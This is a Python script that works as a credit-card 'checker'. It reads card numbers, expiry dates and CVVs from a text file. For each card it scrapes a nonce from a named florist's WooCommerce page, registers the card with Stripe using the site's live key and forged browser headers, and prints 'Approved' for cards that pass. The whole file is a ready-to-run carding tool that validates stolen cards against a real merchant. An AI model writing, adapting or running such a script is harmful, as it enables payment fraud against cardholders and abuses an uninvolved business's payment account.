import aiohttp
import asyncio
import json
import random





DOMAIN = "https://nashvillefloristllc.com/"
PK = "pk_live_qMCeGJBjf8KoTyeQ3MejBvgF"

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def make_request(
    session,
    url,
    method="POST",
    params=None,
    headers=None,
    data=None,
    json=None,
):
    async with session.request(
        method,
        url,
        params=params,
        headers=headers,
        data=data,
        json=json,
    ) as response:
        return await response.text()

async def ppc(cards):
    cc, mon, year, cvv = cards.split("|")
    year = year[-2:]

    async with aiohttp.ClientSession() as my_session:
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "max-age=0",
            "priority": "u=0, i",
            "referer": f"{DOMAIN}/my-account/payment-methods/",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        }

        req = await make_request(
            my_session,
            url=f"{DOMAIN}/my-account/add-payment-method/",
            method="GET",
            headers=headers,
        )
        await asyncio.sleep(1)
        nonce = parseX(req, '"createAndConfirmSetupIntentNonce":"', '"')

        headers2 = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "priority": "u=1, i",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        }

        data2 = {
            "type": "card",
            "card[number]": f"{cc}",
            "card[cvc]": f"{cvv}",
            "card[exp_year]": f"{year}",
            "card[exp_month]": f"{mon}",
            "allow_redisplay": "unspecified",
            "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
            "referrer": DOMAIN,
            "time_on_page": "187650",
            "client_attribution_metadata[client_session_id]": "8c6ceb69-1a1d-4df7-aece-00f48946fa47",
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "guid": "19ae2e71-398b-4dff-929f-1578fe0c0a1a4731fd",
            "muid": "2b6bbdfd-253b-4197-b81b-4d9f3035cd009df6c5",
            "sid": "ad7b0952-8857-4cfd-b07f-3f43034df86cea6048",
            "key": PK,
            "_stripe_version": "2024-06-20",
        }

        req2 = await make_request(
            my_session,
            f"https://api.stripe.com/v1/payment_methods",
            headers=headers2,
            data=data2,
        )
        await asyncio.sleep(1)
        pmid = parseX(req2, '"id": "', '"')

        headers3 = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": DOMAIN,
            "priority": "u=1, i",
            "referer": f"{DOMAIN}/my-account/add-payment-method/",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }
        data3 = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce,
        }
        req4 = await make_request(
            my_session,
            url=f"{DOMAIN}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=headers3,
            data=data3,
        )
        try:
            result = json.loads(req4)

            if result.get("success") is True or result.get("status") == "success":
                print("approved")
                return "Approved"
            else:
                return req4
        except json.JSONDecodeError:
            return req4
        except Exception:
            return "Error:505"


async def main():
    try:
        file_path = "Kopmsu.txt"
        with open(file_path, "r") as file:
            for line in file:
                card = line.strip()
                result = await ppc(card)
                print(f"{card} -> {result}")  # ✅ Print result
    except Exception as e:
        print(f"Error: {e}")


                

if __name__ == "__main__":
    asyncio.run(main())
